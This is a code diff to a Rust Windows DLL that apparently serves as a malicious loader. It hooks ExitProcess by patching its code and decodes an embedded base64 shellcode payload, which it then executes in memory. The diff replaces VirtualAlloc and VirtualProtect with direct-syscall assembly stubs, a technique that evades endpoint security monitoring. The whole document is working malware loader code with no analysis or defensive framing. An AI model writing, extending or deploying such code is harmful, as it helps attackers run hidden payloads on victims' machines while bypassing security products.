@@ -1,5 +1,6 @@
 #![allow(non_snake_case)]
 
+use std::arch::global_asm;
 use windows::core::{PCSTR, PSTR};
 use windows::Win32::Foundation::{BOOL, HINSTANCE};
 use windows::Win32::System::SystemServices::DLL_PROCESS_ATTACH;
@@ -10,15 +11,67 @@ use windows::Win32::System::Threading::{
     INFINITE, WaitForSingleObject, CreateEventA,
 };
 use windows::Win32::System::LibraryLoader::GetModuleHandleA;
-use windows::Win32::System::Memory::{
-    VirtualProtect, VirtualAlloc, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS,
-    MEM_COMMIT, MEM_RESERVE,
-};
 use windows::Win32::UI::WindowsAndMessaging::{ShowWindow, SW_HIDE};
 use base64::{Engine as _, engine::general_purpose};
 use windows::Win32::System::Console::GetConsoleWindow;
 
+mod syscall;
+use syscall::get_syscall_number;
+
 static mut ORIGINAL_EXIT_PROCESS: usize = 0;
+
+global_asm!(r#"
+.global asm_nt_allocate_virtual_memory
+asm_nt_allocate_virtual_memory:
+    mov r10, rcx
+    mov eax, [rsp + 0x38]
+    syscall
+    ret
+
+.global asm_nt_protect_virtual_memory
+asm_nt_protect_virtual_memory:
+    mov r10, rcx
+    mov eax, [rsp + 0x30]
+    syscall
+    ret
+
+.global asm_nt_write_virtual_memory
+asm_nt_write_virtual_memory:
+    mov r10, rcx
+    mov eax, [rsp + 0x30]
+    syscall
+    ret
+"#);
+
+extern "C" {
+    fn asm_nt_allocate_virtual_memory(
+        ProcessHandle: windows_sys::Win32::Foundation::HANDLE,
+        BaseAddress: &mut *mut std::ffi::c_void,
+        ZeroBits: usize,
+        RegionSize: &mut usize,
+        AllocationType: u32,
+        Protect: u32,
+        syscall_id: u32,
+    ) -> windows_sys::Win32::Foundation::NTSTATUS;
+
+    fn asm_nt_protect_virtual_memory(
+        ProcessHandle: windows_sys::Win32::Foundation::HANDLE,
+        BaseAddress: &mut *mut std::ffi::c_void,
+        NumberOfBytesToProtect: &mut usize,
+        NewAccessProtection: u32,
+        OldAccessProtection: &mut u32,
+        syscall_id: u32,
+    ) -> windows_sys::Win32::Foundation::NTSTATUS;
+
+    fn asm_nt_write_virtual_memory(
+        ProcessHandle: windows_sys::Win32::Foundation::HANDLE,
+        BaseAddress: *mut std::ffi::c_void,
+        Buffer: *const std::ffi::c_void,
+        NumberOfBytesToWrite: usize,
+        NumberOfBytesWritten: &mut usize,
+        syscall_id: u32,
+    ) -> windows_sys::Win32::Foundation::NTSTATUS;
+}
 
 macro_rules! export_function {
     ($name:ident) => {
@@ -345,13 +398,21 @@ unsafe fn hook_exit_process() {
 
     ORIGINAL_EXIT_PROCESS = exit_proc_addr as usize;
 
-    let mut old_protect = PAGE_PROTECTION_FLAGS(0);
-    VirtualProtect(
-        exit_proc_addr as *const _,
-        12,
-        PAGE_EXECUTE_READWRITE,
+    let mut base_address = exit_proc_addr as *mut std::ffi::c_void;
+    let mut region_size = 12usize;
+    let mut old_protect = 0u32;
+
+    let nt_protect_id = get_syscall_number("NtProtectVirtualMemory").unwrap();
+    let nt_write_id = get_syscall_number("NtWriteVirtualMemory").unwrap();
+
+    asm_nt_protect_virtual_memory(
+        -1isize as windows_sys::Win32::Foundation::HANDLE,
+        &mut base_address,
+        &mut region_size,
+        windows_sys::Win32::System::Memory::PAGE_EXECUTE_READWRITE,
         &mut old_protect,
-    ).ok();
+        nt_protect_id,
+    );
 
     let hook_addr = fake_exit_process as usize;
 
@@ -368,14 +429,24 @@ unsafe fn hook_exit_process() {
         0xFF, 0xE0,
     ];
 
-    std::ptr::copy_nonoverlapping(patch.as_ptr(), exit_proc_addr, 12);
+    let mut bytes_written = 0usize;
+    asm_nt_write_virtual_memory(
+        -1isize as windows_sys::Win32::Foundation::HANDLE,
+        exit_proc_addr as *mut std::ffi::c_void,
+        patch.as_ptr() as *const std::ffi::c_void,
+        patch.len(),
+        &mut bytes_written,
+        nt_write_id,
+    );
 
-    VirtualProtect(
-        exit_proc_addr as *const _,
-        12,
+    asm_nt_protect_virtual_memory(
+        -1isize as windows_sys::Win32::Foundation::HANDLE,
+        &mut base_address,
+        &mut region_size,
         old_protect,
         &mut old_protect,
-    ).ok();
+        nt_protect_id,
+    );
 }
 
 unsafe extern "system" fn fake_exit_process(_exit_code: u32) {
@@ -388,15 +459,33 @@ const ENCODED_SHELLCODE: &str = "/EiB5PD////o0AAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1I
 unsafe extern "system" fn shellcode_thread(_: *mut core::ffi::c_void) -> u32 {
     let shellcode = general_purpose::STANDARD.decode(ENCODED_SHELLCODE).unwrap();
 
-    let exec_mem = VirtualAlloc(
-        None,
-        shellcode.len(),
-        MEM_COMMIT | MEM_RESERVE,
-        PAGE_EXECUTE_READWRITE,
+    let mut exec_mem: *mut std::ffi::c_void = std::ptr::null_mut();
+    let mut region_size = shellcode.len();
+
+    let nt_alloc_id = get_syscall_number("NtAllocateVirtualMemory").unwrap();
+    let nt_write_id = get_syscall_number("NtWriteVirtualMemory").unwrap();
+
+    let status = asm_nt_allocate_virtual_memory(
+        -1isize as windows_sys::Win32::Foundation::HANDLE,
+        &mut exec_mem,
+        0,
+        &mut region_size,
+        windows_sys::Win32::System::Memory::MEM_COMMIT | windows_sys::Win32::System::Memory::MEM_RESERVE,
+        windows_sys::Win32::System::Memory::PAGE_EXECUTE_READWRITE,
+        nt_alloc_id,
     );
 
-    if !exec_mem.is_null() {
-        std::ptr::copy_nonoverlapping(shellcode.as_ptr(), exec_mem as *mut u8, shellcode.len());
+    if status == 0 && !exec_mem.is_null() {
+        let mut bytes_written = 0usize;
+        asm_nt_write_virtual_memory(
+            -1isize as windows_sys::Win32::Foundation::HANDLE,
+            exec_mem,
+            shellcode.as_ptr() as *const std::ffi::c_void,
+            shellcode.len(),
+            &mut bytes_written,
+            nt_write_id,
+        );
+
         let exec_fn: extern "system" fn() = std::mem::transmute(exec_mem);
         exec_fn();
     }
